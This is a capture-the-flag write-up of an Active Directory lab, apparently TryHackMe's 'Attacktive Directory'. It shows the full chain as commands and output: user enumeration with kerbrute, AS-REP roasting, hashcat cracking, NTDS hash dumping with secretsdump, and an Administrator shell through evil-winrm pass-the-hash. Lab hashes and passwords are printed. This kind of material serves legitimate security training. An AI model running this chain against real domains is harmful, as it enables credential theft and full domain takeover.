---
title: Attacking Directory
parent: Proving Grounds Play
grand_parent: Writeups
nav_order:
---
# Machine
## OS
## Level

---
# Reconnaissance

```zsh
┌──(kali㉿kali)-[~/CTF/THM/AttacktiveDirectory]
└─$ nmap -Pn 10.67.191.107            
Starting Nmap 7.99 ( https://nmap.org ) at 2026-05-24 03:58 +0900
Nmap scan report for THM-AD (10.67.191.107)
Host is up (0.18s latency).
Not shown: 986 closed tcp ports (reset)
PORT     STATE SERVICE
53/tcp   open  domain
80/tcp   open  http
88/tcp   open  kerberos-sec
135/tcp  open  msrpc
139/tcp  open  netbios-ssn
389/tcp  open  ldap
445/tcp  open  microsoft-ds
464/tcp  open  kpasswd5
593/tcp  open  http-rpc-epmap
636/tcp  open  ldapssl
3268/tcp open  globalcatLDAP
3269/tcp open  globalcatLDAPssl
3389/tcp open  ms-wbt-server
5985/tcp open  wsman

Nmap done: 1 IP address (1 host up) scanned in 4.25 seconds
```

```zsh
┌──(kali㉿kali)-[~]
└─$ enum4linux -a 10.67.191.107 
Starting enum4linux v0.9.1 ( http://labs.portcullis.co.uk/application/enum4linux/ ) on Sun May 24 03:36:35 2026

 =========================================( Target Information )=========================================

Target ........... 10.67.191.107
RID Range ........ 500-550,1000-1050
Username ......... ''
Password ......... ''
Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none


 ===========================( Enumerating Workgroup/Domain on 10.67.191.107 )===========================


[E] Can't find workgroup/domain



 ===============================( Nbtstat Information for 10.67.191.107 )===============================

Looking up status of 10.67.191.107
No reply from 10.67.191.107

 ===================================( Session Check on 10.67.191.107 )===================================


[+] Server 10.67.191.107 allows sessions using username '', password ''


 ================================( Getting domain SID for 10.67.191.107 )================================

Domain Name: THM-AD
Domain Sid: S-1-5-21-3591857110-2884097990-301047963

[+] Host is part of a domain (not a workgroup)


 ==================================( OS information on 10.67.191.107 )==================================


[E] Can't get OS info with smbclient


[+] Got OS info for 10.67.191.107 from srvinfo: 
do_cmd: Could not initialise srvsvc. Error was NT_STATUS_ACCESS_DENIED


 =======================================( Users on 10.67.191.107 )=======================================
                                                                                                                    
                                                                                                                    
[E] Couldn't find users using querydispinfo: NT_STATUS_ACCESS_DENIED                                                
                                                                                                                    
                                                                                                                    

[E] Couldn't find users using enumdomusers: NT_STATUS_ACCESS_DENIED                                                 
                                                                                                                    
                                                                                                                    
 =================================( Share Enumeration on 10.67.191.107 )=================================
                                                                                                                    
do_connect: Connection to 10.67.191.107 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)                            

        Sharename       Type      Comment
        ---------       ----      -------
Reconnecting with SMB1 for workgroup listing.
Unable to connect with SMB1 -- no workgroup available

[+] Attempting to map shares on 10.67.191.107                                                                       
                                                                                                                    
                                                                                                                    
 ===========================( Password Policy Information for 10.67.191.107 )===========================
                                                                                                                    
Password:                                                                                                           

[E] Unexpected error from polenum:                                                                                  
                                                                                                                    
                                                                                                                    

[+] Attaching to 10.67.191.107 using a NULL share

[+] Trying protocol 139/SMB...

        [!] Protocol failed: Cannot request session (Called Name:10.67.191.107)

[+] Trying protocol 445/SMB...

        [!] Protocol failed: SAMR SessionError: code: 0xc0000022 - STATUS_ACCESS_DENIED - {Access Denied} A process has requested access to an object but has not been granted those access rights.



[E] Failed to get password policy with rpcclient                                                                    
                                                                                                                    
                                                                                                                    

 ======================================( Groups on 10.67.191.107 )======================================
                                                                                                                    
                                                                                                                    
[+] Getting builtin groups:                                                                                         
                                                                                                                    
                                                                                                                    
[+]  Getting builtin group memberships:                                                                             
                                                                                                                    
                                                                                                                    
[+]  Getting local groups:                                                                                          
                                                                                                                    
                                                                                                                    
[+]  Getting local group memberships:                                                                               
                                                                                                                    
                                                                                                                    
[+]  Getting domain groups:                                                                                         
                                                                                                                    
                                                                                                                    
[+]  Getting domain group memberships:                                                                              
                                                                                                                    
                                                                                                                    
 ==================( Users on 10.67.191.107 via RID cycling (RIDS: 500-550,1000-1050) )==================
                                                                                                                    
                                                                                                                    
[I] Found new SID:                                                                                                  
S-1-5-21-3591857110-2884097990-301047963                                                                            

[I] Found new SID:                                                                                                  
S-1-5-21-3591857110-2884097990-301047963                                                                            

[+] Enumerating users using SID S-1-5-21-3591857110-2884097990-301047963 and logon username '', password ''         
                                                                                                                    
S-1-5-21-3591857110-2884097990-301047963-500 THM-AD\Administrator (Local User)                                      
S-1-5-21-3591857110-2884097990-301047963-501 THM-AD\Guest (Local User)
S-1-5-21-3591857110-2884097990-301047963-502 THM-AD\krbtgt (Local User)
S-1-5-21-3591857110-2884097990-301047963-512 THM-AD\Domain Admins (Domain Group)
S-1-5-21-3591857110-2884097990-301047963-513 THM-AD\Domain Users (Domain Group)
S-1-5-21-3591857110-2884097990-301047963-514 THM-AD\Domain Guests (Domain Group)
S-1-5-21-3591857110-2884097990-301047963-515 THM-AD\Domain Computers (Domain Group)
S-1-5-21-3591857110-2884097990-301047963-516 THM-AD\Domain Controllers (Domain Group)
S-1-5-21-3591857110-2884097990-301047963-517 THM-AD\Cert Publishers (Local Group)
S-1-5-21-3591857110-2884097990-301047963-518 THM-AD\Schema Admins (Domain Group)
S-1-5-21-3591857110-2884097990-301047963-519 THM-AD\Enterprise Admins (Domain Group)
S-1-5-21-3591857110-2884097990-301047963-520 THM-AD\Group Policy Creator Owners (Domain Group)
S-1-5-21-3591857110-2884097990-301047963-521 THM-AD\Read-only Domain Controllers (Domain Group)
S-1-5-21-3591857110-2884097990-301047963-522 THM-AD\Cloneable Domain Controllers (Domain Group)
S-1-5-21-3591857110-2884097990-301047963-525 THM-AD\Protected Users (Domain Group)
S-1-5-21-3591857110-2884097990-301047963-526 THM-AD\Key Admins (Domain Group)
S-1-5-21-3591857110-2884097990-301047963-527 THM-AD\Enterprise Key Admins (Domain Group)
S-1-5-21-3591857110-2884097990-301047963-1000 THM-AD\ATTACKTIVEDIREC$ (Local User)

[+] Enumerating users using SID S-1-5-21-3532885019-1334016158-1514108833 and logon username '', password ''        
                                                                                                                    
S-1-5-21-3532885019-1334016158-1514108833-500 ATTACKTIVEDIREC\Administrator (Local User)                            
S-1-5-21-3532885019-1334016158-1514108833-501 ATTACKTIVEDIREC\Guest (Local User)
S-1-5-21-3532885019-1334016158-1514108833-503 ATTACKTIVEDIREC\DefaultAccount (Local User)
S-1-5-21-3532885019-1334016158-1514108833-504 ATTACKTIVEDIREC\WDAGUtilityAccount (Local User)
S-1-5-21-3532885019-1334016158-1514108833-513 ATTACKTIVEDIREC\None (Domain Group)

 ===============================( Getting printer info for 10.67.191.107 )===============================
                                                                                                                    
do_cmd: Could not initialise spoolss. Error was NT_STATUS_ACCESS_DENIED                                             


enum4linux complete on Sun May 24 03:46:21 2026
```

*user.txtとpass.txtは提供されるものを使用*

```zsh
┌──(kali㉿kali)-[~/CTF/THM/AttacktiveDirectory]
└─$ kerbrute userenum --dc 10.67.191.107 -d THM-AD users.txt 

    __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        

Version: v1.0.3 (9dad6e1) - 05/24/26 - Ronnie Flathers @ropnop

2026/05/24 04:00:19 >  Using KDC(s):
2026/05/24 04:00:19 >   10.67.191.107:88

2026/05/24 04:00:19 >  [+] VALID USERNAME:       james@THM-AD
2026/05/24 04:00:22 >  [+] VALID USERNAME:       svc-admin@THM-AD
2026/05/24 04:00:26 >  [+] VALID USERNAME:       James@THM-AD
2026/05/24 04:00:28 >  [+] VALID USERNAME:       robin@THM-AD
2026/05/24 04:00:43 >  [+] VALID USERNAME:       darkstar@THM-AD
2026/05/24 04:00:52 >  [+] VALID USERNAME:       administrator@THM-AD
2026/05/24 04:01:11 >  [+] VALID USERNAME:       backup@THM-AD
2026/05/24 04:01:20 >  [+] VALID USERNAME:       paradox@THM-AD
2026/05/24 04:02:16 >  [+] VALID USERNAME:       JAMES@THM-AD
2026/05/24 04:02:35 >  [+] VALID USERNAME:       Robin@THM-AD
2026/05/24 04:04:28 >  [+] VALID USERNAME:       Administrator@THM-AD
2026/05/24 04:08:16 >  [+] VALID USERNAME:       Darkstar@THM-AD
2026/05/24 04:09:29 >  [+] VALID USERNAME:       Paradox@THM-AD
2026/05/24 04:13:38 >  [+] VALID USERNAME:       DARKSTAR@THM-AD
2026/05/24 04:14:49 >  [+] VALID USERNAME:       ori@THM-AD
2026/05/24 04:17:00 >  [+] VALID USERNAME:       ROBIN@THM-AD
2026/05/24 04:22:24 >  Done! Tested 73317 usernames (16 valid) in 1325.725 seconds
```

## Kerbrute

![](../../../../assets/images/Pasted%20image%2020260524045335.png)

## AS-REP Roast

```zsh
┌──(kali㉿kali)-[~/CTF/THM/AttacktiveDirectory]
└─$ impacket-GetNPUsers -dc-ip 10.67.191.107  -request -outputfile hashes.asreproast THM-AD/svc-admin
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

Password:
[*] Cannot authenticate svc-admin, getting its TGT
$krb5asrep$23$svc-admin@THM-AD:f3e18b69dda06e33d6d11c3fc92685f3$4e27cdbad0ca885b633b63db1656cc14c39bec5776ecc07d5f267b6af37cd30a49861f02746d9d2469db6a56aa0b173a30e6753e2277e6bfc43f1afd1bbf19c76c8736701d0c3237278cc0f4de11e6c86f3d918a558d0fd1f59982ff0da57531f7c295ee2ab7119f1481943e695e3cc7b70268cc2360cdf6baeddcccbe05b07dca9d25f3e81b26cce0ef0a7eb0e38e3fe5370e64e8c253d651ed53549aea556c45094843576782057568cffab0ba752e644a9c129100836132c0c002f681d89293bf1a408f7ea62375d3106fd524b33bdd9a5868a82b2ee7af0911c18c8b3f86e7b40a0d03e94ab6a0
```
![](../../../../assets/images/Pasted%20image%2020260524045534.png)

https://hashcat.net/wiki/doku.php?id=example_hashes

```zsh
┌──(kali㉿kali)-[~/CTF/THM/AttacktiveDirectory]
└─$ hashcat -m 18200 -a 0 hash.txt pass.txt                                                          
hashcat (v7.1.2) starting

OpenCL API (OpenCL 3.0 PoCL 6.0+debian  Linux, None+Asserts, RELOC, SPIR-V, LLVM 18.1.8, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
====================================================================================================================================================
* Device #01: cpu-haswell-12th Gen Intel(R) Core(TM) i7-12700K, 6955/13911 MB (2048 MB allocatable), 16MCU

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256
Minimum salt length supported by kernel: 0
Maximum salt length supported by kernel: 256

Hashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Optimizers applied:
* Zero-Byte
* Not-Iterated
* Single-Hash
* Single-Salt

ATTENTION! Pure (unoptimized) backend kernels selected.
Pure kernels can crack longer passwords, but drastically reduce performance.
If you want to switch to optimized kernels, append -O to your commandline.
See the above message to find out about the exact limits.

Watchdog: Temperature abort trigger set to 90c

Host memory allocated for this attack: 516 MB (10534 MB free)

Dictionary cache built:
* Filename..: pass.txt
* Passwords.: 70188
* Bytes.....: 569236
* Keyspace..: 70188
* Runtime...: 0 secs

$krb5asrep$23$svc-admin@THM-AD:f3e18b69dda06e33d6d11c3fc92685f3$4e27cdbad0ca885b633b63db1656cc14c39bec5776ecc07d5f267b6af37cd30a49861f02746d9d2469db6a56aa0b173a30e6753e2277e6bfc43f1afd1bbf19c76c8736701d0c3237278cc0f4de11e6c86f3d918a558d0fd1f59982ff0da57531f7c295ee2ab7119f1481943e695e3cc7b70268cc2360cdf6baeddcccbe05b07dca9d25f3e81b26cce0ef0a7eb0e38e3fe5370e64e8c253d651ed53549aea556c45094843576782057568cffab0ba752e644a9c129100836132c0c002f681d89293bf1a408f7ea62375d3106fd524b33bdd9a5868a82b2ee7af0911c18c8b3f86e7b40a0d03e94ab6a0:management2005
                                                          
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 18200 (Kerberos 5, etype 23, AS-REP)
Hash.Target......: $krb5asrep$23$svc-admin@THM-AD:f3e18b69dda06e33d6d1...4ab6a0
Time.Started.....: Sun May 24 04:18:02 2026 (0 secs)
Time.Estimated...: Sun May 24 04:18:02 2026 (0 secs)
Kernel.Feature...: Pure Kernel (password length 0-256 bytes)
Guess.Base.......: File (pass.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#01........:   960.9 kH/s (5.93ms) @ Accel:1024 Loops:1 Thr:1 Vec:8
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 16384/70188 (23.34%)
Rejected.........: 0/16384 (0.00%)
Restore.Point....: 0/70188 (0.00%)
Restore.Sub.#01..: Salt:0 Amplifier:0-1 Iteration:0-1
Candidate.Engine.: Device Generator
Candidates.#01...: m123456 -> cowgirlup
Hardware.Mon.#01.: Util:  8%

Started: Sun May 24 04:17:24 2026
Stopped: Sun May 24 04:18:03 2026
```
![](../../../../assets/images/Pasted%20image%2020260524045623.png)
management2005

```zsh
┌──(kali㉿kali)-[~/CTF/THM/AttacktiveDirectory]
└─$ smbclient -L //10.67.191.107 -U 'svc-admin'
Password for [WORKGROUP\svc-admin]:

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        backup          Disk      
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
        NETLOGON        Disk      Logon server share 
        SYSVOL          Disk      Logon server share 
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to 10.67.191.107 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Unable to connect with SMB1 -- no workgroup available
```

```zsh
┌──(kali㉿kali)-[~/CTF/THM/AttacktiveDirectory]
└─$ smbclient //10.67.191.107/backup -U 'svc-admin' 
Password for [WORKGROUP\svc-admin]:
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Sun Apr  5 04:08:39 2020
  ..                                  D        0  Sun Apr  5 04:08:39 2020
  backup_credentials.txt              A       48  Sun Apr  5 04:08:53 2020

                8247551 blocks of size 4096. 3697494 blocks available
smb: \> get backup_credentials.txt 
getting file \backup_credentials.txt of size 48 as backup_credentials.txt (0.1 KiloBytes/sec) (average 0.1 KiloBytes/sec)
smb: \> exit
```

```zsh
┌──(kali㉿kali)-[~/CTF/THM/AttacktiveDirectory]
└─$ cat backup_credentials.txt 
YmFja3VwQHNwb29reXNlYy5sb2NhbDpiYWNrdXAyNTE3ODYw
```

```zsh
┌──(kali㉿kali)-[~/CTF/THM/AttacktiveDirectory]
└─$ echo YmFja3VwQHNwb29reXNlYy5sb2NhbDpiYWNrdXAyNTE3ODYw | base64 -d
backup@spookysec.local:backup2517860
```

## impacket-secretdump
*backupユーザの権限を使って各ユーザのハッシュを取得*

```zsh
┌──(kali㉿kali)-[~/CTF/THM/AttacktiveDirectory]
└─$ impacket-secretsdump -just-dc-user backup THM-AD/backup:"backup2517860"@10.67.191.107
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
spookysec.local\backup:1118:aad3b435b51404eeaad3b435b51404ee:19741bde08e135f4b40f1ca9aab45538:::
[*] Kerberos keys grabbed
spookysec.local\backup:aes256-cts-hmac-sha1-96:23566872a9951102d116224ea4ac8943483bf0efd74d61fda15d104829412922
spookysec.local\backup:aes128-cts-hmac-sha1-96:843ddb2aec9b7c1c5c0bf971c836d197
spookysec.local\backup:des-cbc-md5:d601e9469b2f6d89
[*] Cleaning up...
```

```zsh
┌──(kali㉿kali)-[~/CTF/THM/AttacktiveDirectory]
└─$ impacket-secretsdump -just-dc-user Administrator THM-AD/backup:"backup2517860"@10.67.191.107
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:0e0363213e37b94221497260b0bcb4fc:::
[*] Kerberos keys grabbed
Administrator:aes256-cts-hmac-sha1-96:713955f08a8654fb8f70afe0e24bb50eed14e53c8b2274c0c701ad2948ee0f48
Administrator:aes128-cts-hmac-sha1-96:e9077719bc770aff5d8bfc2d54d226ae
Administrator:des-cbc-md5:2079ce0e5df189ad
[*] Cleaning up...
```

# Initial Access

```zsh
┌──(kali㉿kali)-[~/CTF/THM/AttacktiveDirectory]
└─$ evil-winrm -i 10.67.191.107 -u Administrator -H 0e0363213e37b94221497260b0bcb4fc 
                                        
Evil-WinRM shell v3.9
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline                                                                                                        
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion                                                                                                                   
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents>
```
